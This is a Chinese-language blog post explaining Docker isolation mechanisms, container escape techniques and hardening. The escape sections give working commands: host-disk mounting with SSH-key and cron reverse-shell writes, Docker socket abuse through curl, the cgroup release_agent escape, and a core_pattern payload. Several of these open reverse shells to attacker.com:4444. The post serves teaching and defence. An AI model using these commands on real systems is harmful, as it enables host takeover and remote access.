---
title: 容器逃逸讲解—Docker 隔离机制与逃逸技术深度分析
date: 2026-09-12 14:00:00
categories: [运维开发]
tags: [运维, Docker]
cover: https://cdn.jsdelivr.net/gh/TSVMV/TSVMV.github.io@main/source/img/bg7.jpg
---

## 容器隔离的本质

Docker 容器不是虚拟机，它和宿主机共享同一个内核。容器的"隔离"是通过 Linux 内核的三个机制实现的：

1. **Namespaces**：隔离视图——容器看不到宿主机的进程、网络、挂载点等
2. **Cgroups**：限制资源——CPU、内存、IO 的使用上限
3. **Capabilities**：限制权限——容器内的 root 只有一部分 root 权限

理解容器逃逸的关键是理解这三层隔离的边界在哪里、哪里有漏洞、哪里配置不当。容器逃逸本质上就是：**从容器的受限环境中，获取对宿主机的代码执行或文件系统访问权限**。

<!-- more -->

## Namespace 隔离详解

| Namespace | 隔离内容 | 克隆标志 |
|-----------|----------|----------|
| PID | 进程 ID | CLONE_NEWPID |
| NET | 网络栈 | CLONE_NEWNET |
| MNT | 挂载点 | CLONE_NEWNS |
| UTS | 主机名/域名 | CLONE_NEWUTS |
| IPC | 进程间通信 | CLONE_NEWIPC |
| USER | 用户/组 ID | CLONE_NEWUSER |
| CGROUP | cgroup 根目录 | CLONE_NEWCGROUP |

容器内的 PID 1 实际上在宿主机上是另一个 PID。容器内看到的根文件系统是宿主机上的一个目录（overlayfs 联合挂载）。容器内的网络是一个独立的 network namespace，通过 veth pair 和宿主机的 docker0 网桥通信。

关键：Namespace 只隔离"视图"，不隔离"资源"。容器内的进程仍然运行在宿主机内核上，仍然可以通过系统调用访问内核功能——只是看到的东西被限制了。

## Capabilities 与权限

Linux 把传统的 root 权限拆分成了 40+ 个 capabilities。Docker 默认只授予容器一小部分：

```
CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FOWNER, CAP_FSETID,
CAP_KILL, CAP_SETGID, CAP_SETUID, CAP_SETPCAP,
CAP_NET_BIND_SERVICE, CAP_NET_RAW, CAP_SYS_CHROOT,
CAP_MKNOD, CAP_AUDIT_WRITE, CAP_SETFCAP
```

危险的 capabilities 默认被移除了，包括：
- `CAP_SYS_ADMIN`：最危险，几乎等于 root
- `CAP_SYS_MODULE`：加载内核模块
- `CAP_SYS_PTRACE`：ptrace 其他进程
- `CAP_NET_ADMIN`：网络配置
- `CAP_SYS_RAWIO`：直接 IO 端口访问

如果容器以 `--privileged` 启动，或者被授予了危险的 capabilities，逃逸就变得非常简单。

## 逃逸技术分类

### 第一类：配置不当导致的逃逸

#### 1. --privileged 容器

`--privileged` 授予容器所有 capabilities + 访问所有宿主机设备 + 关闭 AppArmor/SELinux 限制。这基本等于没有隔离。

**利用：挂载宿主机根文件系统**

```bash
# 在 privileged 容器内
# 查看宿主机磁盘设备
fdisk -l

# 挂载宿主机根分区到 /mnt
mount /dev/sda1 /mnt

# 现在可以访问宿主机的所有文件
chroot /mnt /bin/bash

# 或者直接写 SSH 公钥
echo "ssh-rsa AAAA..." >> /mnt/root/.ssh/authorized_keys

# 或者写 cron 反弹 shell
echo '* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /mnt/var/spool/cron/root
```

#### 2. 危险的 capabilities

**CAP_SYS_ADMIN + 挂载宿主机磁盘**

```bash
# 即使不是 --privileged，但有 CAP_SYS_ADMIN
# 可以挂载宿主机的 cgroup 或磁盘
mkdir /tmp/cgroup
mount -t cgroup -o memory cgroup /tmp/cgroup
# 通过 cgroup 逃逸（见下文 release_agent 方法）
```

**CAP_SYS_MODULE：加载内核模块**

```bash
# 有 CAP_SYS_MODULE 可以直接加载内核模块
# 编写一个恶意内核模块，加载后在宿主机执行任意代码
insmod evil.ko
```

**CAP_SYS_PTRACE：ptrace 宿主机进程**

如果容器共享了 PID namespace（`--pid=host`），可以 ptrace 宿主机进程，注入 shellcode。

#### 3. 挂载宿主机敏感目录

当容器挂载了宿主机的敏感目录时，可以直接读写宿主机文件：

```bash
# 危险挂载
docker run -v /:/host ...
docker run -v /var/run/docker.sock:/var/run/docker.sock ...
docker run -v /root/.ssh:/root/.ssh ...
docker run -v /etc:/etc ...
```

**Docker Socket 逃逸**

挂载了 `/var/run/docker.sock` 等于控制了 Docker daemon，可以创建一个特权容器挂载宿主机根目录：

```bash
# 在容器内，通过 docker.sock 创建新的特权容器
curl -XPOST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  http://localhost/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "chroot /mnt /bin/bash"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt"]
    }
  }'

# 启动容器
curl -XPOST --unix-socket /var/run/docker.sock \
  http://localhost/containers/<id>/start
```

#### 4. --pid=host / --net=host

共享宿主机的 PID 或网络 namespace：

- `--pid=host`：可以看到并信号/ptrace 宿主机进程
- `--net=host`：可以监听宿主机端口、嗅探流量、访问宿主机本地服务

### 第二类：内核漏洞导致的逃逸

容器和宿主机共享内核，因此**任何内核本地提权漏洞都可以用于容器逃逸**。容器内的进程可以触发内核漏洞，获取内核代码执行，然后突破 namespace 限制。

经典的内核逃逸漏洞：
- **Dirty COW (CVE-2016-5195)**：写时复制竞争条件，写只读文件
- **Dirty Pipe (CVE-2022-0847)**：管道缓冲区标志残留，写只读文件
- **PwnKit (CVE-2021-4034)**：pkexec 环境变量处理，本地提权
- **Dirty Sock (CVE-2019-7304)**：snapd 本地提权
- **io_uring 相关漏洞**：多个 CVE，异步 IO 实现中的越界读写

内核漏洞逃逸的一般流程：
1. 在容器内编译/上传 exploit
2. 执行 exploit，获取 root 权限（容器内的 root）
3. 但容器内的 root 仍然受 namespace 限制，需要进一步逃逸
4. 利用内核代码执行，直接修改 task_struct 的 nsproxy，跳出 namespace
5. 或者利用内核代码执行，调用 commit_creds(prepare_kernel_cred(0)) 获取真正的 root，然后 setns 到宿主机的 namespace

### 第三类：cgroup 逃逸

#### release_agent 逃逸（CVE-2022-0492 之前的经典方法）

cgroup 的 `release_agent` 是一个在 cgroup 中最后一个进程退出时自动执行的脚本。如果容器有 `CAP_SYS_ADMIN`，可以挂载 cgroup 文件系统，设置 release_agent 为恶意脚本，然后创建子 cgroup 并在其中运行进程，进程退出时触发 release_agent——这个脚本会在宿主机的 root 上下文中执行。

```bash
# 1. 挂载 cgroup
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. 创建子 cgroup
mkdir /tmp/cgrp/x

# 3. 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 4. 获取宿主机根目录路径（容器内路径到宿主机路径的映射）
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo)

# 5. 设置 release_agent 为恶意脚本
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 6. 写恶意脚本
echo '#!/bin/sh' > /cmd
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /cmd
chmod +x /cmd

# 7. 在子 cgroup 中运行进程，进程退出触发 release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

这个方法在 CVE-2022-0492 修复后需要额外条件（如 CAP_SYS_ADMIN 或非 root 用户的 cgroup namespace 配置不当）。

### 第四类：procfs / sysfs 逃逸

#### /proc/sys/kernel/core_pattern

`core_pattern` 控制进程崩溃时 core dump 的处理方式。如果它以 `|` 开头，内核会把 core dump 管道给指定的程序处理——这个程序在宿主机的 root 上下文中执行。

如果容器可以写 `/proc/sys/kernel/core_pattern`（需要特权或特定挂载），可以：

```bash
# 设置 core_pattern 为恶意脚本
echo '|bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' > /proc/sys/kernel/core_pattern

# 触发一个段错误
ulimit -c unlimited
kill -SIGSEGV $$
```

#### /proc/1/root 符号链接

容器内的 `/proc/1/root` 指向容器 PID 1 的根目录（即容器自身的根），但如果共享了 PID namespace（`--pid=host`），`/proc/1/root` 指向宿主机的根目录：

```bash
# --pid=host 容器内
chroot /proc/1/root /bin/bash
```

### 第五类：运行时漏洞

#### runc 逃逸（CVE-2019-5736）

runc 是 Docker 的底层运行时。CVE-2019-5736 允许容器内的恶意进程覆盖宿主机上的 runc 二进制，从而在宿主机上执行任意代码。

利用条件：容器内可以执行 `/proc/self/exe`（即 runc init），且容器以 root 运行。

利用流程：
1. 在容器内创建一个恶意的 `/bin/sh`，指向 `/proc/self/exe`
2. 当用户 `docker exec` 进入容器时，runc 会执行这个 `/bin/sh`
3. 恶意程序打开 `/proc/self/exe`（即宿主机上的 runc 二进制）进行写入
4. 覆盖 runc 二进制为恶意代码
5. 下次 runc 被调用时，恶意代码在宿主机 root 上下文中执行

#### containerd 逃逸

containerd 的类似漏洞，如 CVE-2020-15257（containerd-shim 抽象套接字权限不当），允许容器内进程通过 Unix 域套接字与宿主机的 containerd-shim 通信，实现逃逸。

## 防御与加固

### 1. 最小权限原则

- 不要用 `--privileged`
- 只授予必要的 capabilities：`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`
- 用非 root 用户运行容器：`--user 1000:1000`
- 设置 `--read-only` 根文件系统
- 限制 `--security-opt=no-new-privileges`

### 2. 安全挂载

- 不要挂载 `/`、`/var/run/docker.sock`、`/root`、`/etc`
- 挂载卷用 `:ro`（只读）除非必须写入
- 不要用 `--pid=host`、`--net=host` 除非必要

### 3. 内核加固

- 及时更新内核，修复已知漏洞
- 启用 SELinux / AppArmor
- 启用 seccomp 过滤系统调用（Docker 默认有 seccomp profile）
- 用 gVisor、Kata Containers 等强隔离运行时

### 4. 运行时加固

```bash
# 推荐的安全启动参数
docker run \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --read-only \
  --tmpfs /tmp \
  --tmpfs /run \
  --security-opt=no-new-privileges \
  --security-opt seccomp=default.json \
  --user 1000:1000 \
  --memory=512m \
  --pids-limit=100 \
  myimage
```

### 5. 镜像安全

- 用最小基础镜像（alpine、distroless）
- 定期扫描镜像漏洞（Trivy、Clair）
- 不要在镜像中硬编码密钥
- 用多阶段构建减小攻击面

## 容器逃逸检测

### 检测是否在容器中

```bash
# 检查 /.dockerenv
ls -la /.dockerenv

# 检查 cgroup
cat /proc/1/cgroup | grep -i docker

# 检查进程 1
cat /proc/1/cmdline  # 容器内通常是 /sbin/init 或应用本身

# 检查设备
ls -la /dev/ | grep -v "total\|^d\|^l"  # 容器内设备很少
```

### 检测逃逸路径

在容器内做信息收集，判断可能的逃逸路径：

```bash
# 1. 检查 capabilities
capsh --print

# 2. 检查挂载
mount | grep -v "proc\|sysfs\|cgroup\|tmpfs\|devpts\|mqueue\|shm"

# 3. 检查是否有 docker.sock
ls -la /var/run/docker.sock

# 4. 检查内核版本（寻找已知漏洞）
uname -r

# 5. 检查是否是 privileged
# 如果能看到宿主机所有设备，就是 privileged
ls /dev/ | wc -l

# 6. 检查 cgroup 可写性
ls -la /sys/fs/cgroup/
```

## 总结

容器逃逸是云原生安全的核心议题。理解逃逸技术的关键是理解容器隔离的三层机制（Namespaces、Cgroups、Capabilities）的边界和缺陷。逃逸技术可以分为五大类：配置不当、内核漏洞、cgroup 逃逸、procfs/sysfs 逃逸、运行时漏洞。

对于防御者来说，最小权限原则是最有效的防御——不要给容器它不需要的权限和挂载。对于攻击者来说，容器逃逸的第一步永远是信息收集：判断自己有什么 capabilities、挂载了什么、内核版本是什么，然后选择对应的逃逸路径。

容器逃逸是一个持续演进的领域——新的内核漏洞、新的运行时漏洞、新的配置错误不断出现。保持对最新 CVE 和安全研究的关注，是这个领域从业者的必修课。
